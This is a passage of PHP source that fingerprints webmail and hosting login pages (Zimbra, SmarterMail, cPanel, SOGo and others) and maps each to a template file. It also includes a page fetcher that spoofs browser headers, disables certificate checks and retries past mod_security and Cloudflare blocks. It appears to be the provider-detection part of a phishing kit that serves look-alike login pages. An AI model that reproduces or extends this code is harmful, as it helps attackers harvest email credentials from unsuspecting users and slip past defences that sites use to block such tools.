        str_contains($h, 'sogo_login') ||
        str_contains($h, 'ng-app="sogo"') ||
        str_contains($h, 'webmail.sogo') ||
        preg_match('#/SOGo/WebMailer#i', $html)) {
        return 'mailcow.php';
    }

    if (str_contains($h, 'smartermail') ||
        str_contains($h, 'smartermail enterprise') ||
        str_contains($h, 'login to smartermail') ||
        str_contains($h, 'smartertools') ||
        str_contains($h, 'svlogin') ||
        str_contains($h, 'sm-login') ||
        str_contains($h, 'id="ctl00_ctrlView"') ||
        str_contains($h, 'id="ctl00_ContentPlaceHolder1_loginForm"')) {
        return 'smarter.php';
    }

    if (str_contains($h, 'zimbra') ||
        str_contains($h, 'zm_login') ||
        str_contains($h, '/service/soap') ||
        str_contains($h, 'zm_client')) {
        return 'zimbra.php';
    }

    // cPanel — after all provider-specific signatures
    if (str_contains($h, 'cpsess') ||
        str_contains($h, 'cpanel') ||
        str_contains($h, '/cpanel') ||
        str_contains($h, 'whm-server-status') ||
        str_contains($h, 'cpanel, l.l.c.') ||
        str_contains($h, 'cpanel, inc.') ||
        str_contains($h, 'login/?login_only=1')) {
        return 'cpw.php';
    }

    if (str_contains($h, 'mailenable')) return 'enable.php';
    if (str_contains($h, 'icewarp'))    return 'icewarp.php';
    if (str_contains($h, 'mdaemon') || str_contains($h, 'worldclient')) return 'mdaemon.php';
    if (str_contains($h, 'horde'))      return 'horde.php';
    if (str_contains($h, 'dreamhost'))  return 'dreamhost.php';
    if (str_contains($h, 'networksolutions') || str_contains($h, 'netsol')) return 'netsol.php';
    if (str_contains($h, 'udomain'))    return 'udomain.php';
    if (str_contains($h, 'mailnara'))   return 'mailnara.php';
    if (str_contains($h, 'hostinger'))  return 'hostinger.php';

    return null;
}

// ------------------------------------------------------------
// fetchPage — mod_security-aware, filters WAF block pages
// ------------------------------------------------------------
function fetchPage(string $url): ?string {
    $body = _fetchPageRaw($url);
    if ($body !== null && isModSecurityBlock($body)) {
        return null;
    }
    return $body;
}

function isModSecurityBlock(string $body): bool {
    if ($body === '') return false;

    $head  = substr($body, 0, 4096);
    $lower = strtolower($head);

    if (str_contains($lower, 'not acceptable!') &&
        str_contains($lower, 'appropriate representation')) {
        return true;
    }
    if (str_contains($lower, 'mod_security') || str_contains($lower, 'modsecurity')) {
        return true;
    }
    if (str_contains($lower, 'this error was generated by mod_security')) {
        return true;
    }
    if (str_contains($lower, '406 not acceptable')) {
        return true;
    }

    if (str_contains($lower, 'attention required! | cloudflare')) return true;
    if (str_contains($lower, 'error 1020'))                       return true;
    if (str_contains($lower, 'cf-error-details'))                 return true;
    if (str_contains($lower, 'website is offline'))               return true;
    if (str_contains($lower, 'this site can’t be reached'))       return true;
    if (str_contains($lower, "this site can't be reached"))       return true;
    if (str_contains($lower, 'domain not found'))                 return true;

    if (str_contains($lower, '<title>403 forbidden</title>'))     return true;
    if (str_contains($lower, '<title>404 not found</title>') &&
        strlen($body) < 600)                                       return true;

    return false;
}

function _fetchPageRaw(string $url): ?string {
    if (!function_exists('curl_init')) {
        $ctx = stream_context_create([
            'http' => [
                'method'  => 'GET',
                'timeout' => 6,
                'header'  => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n"
                           . "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                           . "Accept-Language: en-US,en;q=0.9\r\n",
            ],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
        ]);
        $body = @file_get_contents($url, false, $ctx);
        return $body === false ? null : $body;
    }

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS      => 5,
        CURLOPT_TIMEOUT        => 8,
        CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        CURLOPT_HTTPHEADER     => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.9',
            'Accept-Encoding: gzip, deflate, br',
            'Connection: keep-alive',
            'Upgrade-Insecure-Requests: 1',
            'Sec-Fetch-Dest: document',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Site: none',
            'Sec-Fetch-User: ?1',
            'Cache-Control: max-age=0',
        ],
        CURLOPT_ENCODING       => '',
    ]);

    $body     = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode === 406 || $httpCode === 403) {
        $ch2 = curl_init($url);
        curl_setopt_array($ch2, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS      => 3,
            CURLOPT_TIMEOUT        => 6,
            CURLOPT_CONNECTTIMEOUT => 3,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            CURLOPT_HTTPHEADER     => [
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.9',
            ],
        ]);
        $body = curl_exec($ch2);
        curl_close($ch2);
    }

    return $body === false ? null : $body;
}